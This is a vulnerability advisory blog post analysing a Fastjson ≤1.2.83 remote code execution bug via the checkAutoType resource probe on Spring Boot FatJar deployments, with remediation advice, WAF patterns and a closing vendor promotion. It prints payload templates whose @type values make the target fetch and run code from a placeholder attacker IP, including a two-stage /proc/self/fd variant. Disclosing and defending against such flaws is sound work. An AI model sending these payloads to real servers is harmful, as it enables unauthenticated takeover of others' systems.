---
title: "Fastjson ≤ 1.2.83 RCE: Resource Probe Bypasses AutoType Gating"
description: "Technical analysis of Fastjson ≤ 1.2.83 checkAutoType resource-probe RCE. ZAST.AI verified that the resource-probe path in checkAutoType() runs even with AutoType disabled, and feeds untrusted class names to ClassLoader.getResourceAsStream() under Spring Boot FatJar deployments."
keywords: "fastjson, fastjson rce, fastjson 1.2.83, fastjson 0day, fastjson 1.2.83 rce, checkAutoType, AutoType bypass, resource probe, ClassLoader, Spring Boot, FatJar, CWE-94, ZAST.AI"
date: 2026-07-21
categories: ["Vulnerability Research", "Application Security"] 
tags:
  [
    "Fastjson",
    "RCE",
    "AutoType",
    "Java Deserialization",
    "Spring Boot",
    "ZAST.AI"
  ]
author: ZAST Team
image: assets/img/logo-single.png
excerpt: "Fastjson ≤ 1.2.83: the checkAutoType resource-probe path runs even with AutoType disabled. On Spring Boot FatJar deployments, an attacker can achieve RCE by constructing a @type value that resolves to a remote URL — no classic deserialization gadgets required."
---

| Field | Content |
|---|---|
| Target Project | Fastjson (alibaba/fastjson) |
| Vulnerability Type | RCE - checkAutoType Resource Probe Bypass (CWE-94) |
| Max Severity | High (CVSS 8.1) |
| Affected Versions | 1.2.68 ~ 1.2.83 (1.x EOL) |
| Key Location | `ParserConfig.checkAutoType()` |
| Project Popularity | ~25k GitHub Stars (at time of analysis) |
| Verification Engine | ZAST.AI |

## Timeline

| Date | Event |
|---|---|
| July 19 | Kirill Firsov (@k_firsov) publicly disclosed the technique on X |
| July 21 | Public PoC released (github.com/midisec/fastjson-1.2.83-gadget-rce), supporting JDK 8/17/21/25 with batch URL verification |

Fastjson is Alibaba's high-performance JSON library, one of the most widely used JSON components in the Java ecosystem. Its AutoType mechanism allows specifying the deserialization target class via `@type` in JSON, and has been exploited multiple times historically. The official project has added block/allow lists and a safeMode flag across multiple versions.

But this issue does not go through the AutoType block/allow list.

## 1. Vulnerability Mechanism: checkAutoType Resource Probe

`ParserConfig.checkAutoType()` executes a "resource probe" on the `@type` field value even when AutoType is disabled by default:

```java
String resource = typeName.replace('.', '/') + ".class";
if (defaultClassLoader != null) {
    is = defaultClassLoader.getResourceAsStream(resource);
} else {
    is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
}
if (is != null) {
    ClassReader classReader = new ClassReader(is, true);
    TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
    classReader.accept(visitor);
    jsonType = visitor.hasJsonType();
}
```

It replaces `.` with `/` in the class name to form a resource path and passes it to `ClassLoader.getResourceAsStream()`. If the returned bytecode carries the `@JSONType` annotation (detected via a bundled ASM scanner), the class is loaded and instantiated without passing through the AutoType block/allow list.

## 2. Prerequisite: Spring Boot FatJar Deployment

When the target application is deployed as a Spring Boot executable FatJar, `ParserConfig` is loaded by Spring Boot's `LaunchedURLClassLoader` (Boot 2.x) or `LaunchedClassLoader` (Boot 3.x). These class loaders support resolving resource names as `jar:http://...` or `jar:file:...` URLs, making real network connections.

An attacker crafts a `@type` string so that after `.` → `/` conversion it becomes a URL pointing to the attacker's server, tricking the target into downloading and instantiating a custom `@JSONType` class to execute arbitrary code.

This exploitation chain does not rely on any classic deserialization gadget (such as `JdbcRowSetImpl`, `TemplatesImpl`) on the classpath—only the target's own Spring Boot Loader mechanism. It is therefore described as a "gadget-free" exploitation chain.

## 3. Exploitation: JDK 8 vs JDK 17/21

### JDK 8: Single-Request RCE

The attacker constructs a `@type` string that, after `.` → `/` replacement, resolves to an attacker-controlled HTTP URL. `checkAutoType` issues a GET request to that URL, reads the bytecode, detects `@JSONType`, loads and instantiates the class, and `<clinit>` executes—RCE in a single request.

### JDK 17/21: Two-Stage fd Enumeration

JDK 9+ enforces class name validation on `jar:http://` URLs containing consecutive `//`, preventing direct loading. The workaround uses two stages:

1. **Stage 1**: Send the first element of a JSON array to trigger a real HTTP fetch, causing the target JVM to hold an open socket file descriptor (fd=N).
2. **Stage 2**: The remaining 254 elements each attempt `jar:file:/proc/self/fd/N!/...`, reusing the fd from stage 1 via Linux's `/proc/self/fd/N`. The `jar:file:` single-slash syntax does not trigger the JDK 9+ class name check, so `defineClass` succeeds.

### JDK 25

Probe requests are still sent (SSRF confirmed), but no code execution echo was obtained.

See the PoC section below for payloads and the full call stack.

## 4. PoC Verification

### JDK 8: Single-Request Payload

```json
{"@type":"http:..<attacker_IP_integer>:<port>.<random_class>"}
```

`checkAutoType` replaces `.` with `/`, producing `http://<attacker_IP>:<port>/<random_class>.class`, sends an HTTP GET, reads the bytecode, detects `@JSONType`, loads and instantiates the class, and `<clinit>` executes.

### JDK 17/21: Two-Stage JSON Array Payload

```json
[
  {"@type":"jar:http:..<IP_int>:<port>.probe!.foo.<class>"},
  {"@type":"jar:file:.proc.self.fd.3!.fd3.<class>"},
  {"@type":"jar:file:.proc.self.fd.4!.fd4.<class>"},
  "... up to fd256 ..."
]
```

The first element triggers a real HTTP fetch, leaving the JVM with a socket file descriptor (fd=N). The remaining 254 elements attempt to reuse that fd via `jar:file:/proc/self/fd/N`, bypassing the JDK 9+ class name check with the single-slash syntax.

### Data Flow: From HTTP Request to RCE

```
ParseController.parse(String)                    // @PostMapping("/parse")
  JSON.parse(String)
    DefaultJSONParser.parseObject()              // SOURCE: reads @type
      ParserConfig.checkAutoType(typeName, ...)  // SINK: resource probe
        ClassLoader.getResourceAsStream(...)     // HTTP GET to attacker
        ClassReader.accept(TypeCollector)        // detect @JSONType
        TypeUtils.loadClass(typeName, ...)       // load & instantiate
          ClassLoader.defineClass(...)           // define attacker class
            <attacker_class>.<clinit>()          // RCE: Runtime.exec(...)
```

### Verification Results

The public PoC (github.com/midisec/fastjson-1.2.83-gadget-rce) has verified the following environments:

| Environment | Deployment | Result |
|---|---|---|
| JDK 8u442 (Linux container) | Spring Boot 2.7 FatJar | RCE success, `uid=0(root)` |
| JDK 17.0.19 (Linux container) | Spring Boot 3.2 FatJar | RCE success (fd mode), `uid=0(root)` |
| JDK 21.0.11 (Linux container) | Spring Boot 3.2 FatJar | RCE success (fd mode), `uid=0(root)` |
| JDK 25.0.3 (Linux container) | Spring Boot 3.2 FatJar | SSRF confirmed, no code execution echo |

The PoC executes `id` by default and confirms results via HTTP callback. It supports batch URL verification with JSONL output. The fd mode depends on Linux's `/proc/self/fd/N` mechanism and cannot be reproduced on macOS or Windows.

![PoC Demo]({{ "/assets/img/fastjson_rce.gif" | relative_url }})

## 5. Remediation

1. **Enable SafeMode**: `-Dfastjson.parser.safeMode=true` or `ParserConfig.getGlobalInstance().setSafeMode(true)`. SafeMode rejects any `@type` at the entry point, shutting down the resource-probe path entirely.

2. **Migrate to fastjson2**: The 1.x line is EOL; fastjson2 has a redesigned AutoType mechanism.

3. **Restrict egress traffic**: Limit outbound network access from application processes to reduce the feasibility of remote payload download even if a probe is triggered.

4. **WAF rules**: Block request bodies containing `"@type":"jar:http:.`, `"@type":"jar:file:.`, and `"@type":"http:.` patterns.

## ZAST.AI Detection Coverage

ZAST.AI uses semantic analysis to trace the data flow from untrusted `@type` input to `ClassLoader.getResourceAsStream()`. The SOURCE is in `DefaultJSONParser.parseObject()`, which reads the `@type` field; the SINK is in `ParserConfig.checkAutoType()`, where the untrusted class name is converted to a resource path via `.` → `/` replacement. This identifies the dangerous data flow from untrusted input to remote resource loading, consistent with the vulnerability root cause and attack surface.

## Conclusion

The core of this vulnerability is not about bypassing a specific blocklist entry. It is that `checkAutoType()` contains a code path—the resource probe—that exists independently of the AutoType block/allow list. This path runs even when AutoType is disabled, and passes an untrusted class name to a ClassLoader that may resolve remote URLs. SafeMode cuts this path at the source, but under default configuration, any application deployed as a Spring Boot FatJar with an external JSON deserialization interface is exploitable without authentication.

From disclosure to public PoC was just two days. Automated batch verification tools are already available. Affected teams should enable SafeMode or migrate to fastjson2 as soon as possible.

References:
- https://x.com/k_firsov/status/2078872293745570032
- https://github.com/midisec/fastjson-1.2.83-gadget-rce
- https://github.com/alibaba/fastjson

---

**ZAST.AI is offering free testing during its anniversary promotion.** Upload a code package to detect Fastjson checkAutoType resource-probe RCE and other deserialization vulnerabilities—no environment setup required.

👉 [Try it now](https://zast.ai/anniversary?utm_source=blog&utm_medium=organic_content&utm_campaign=zast_1st_anniversary_2026&utm_content=blog_post_en)
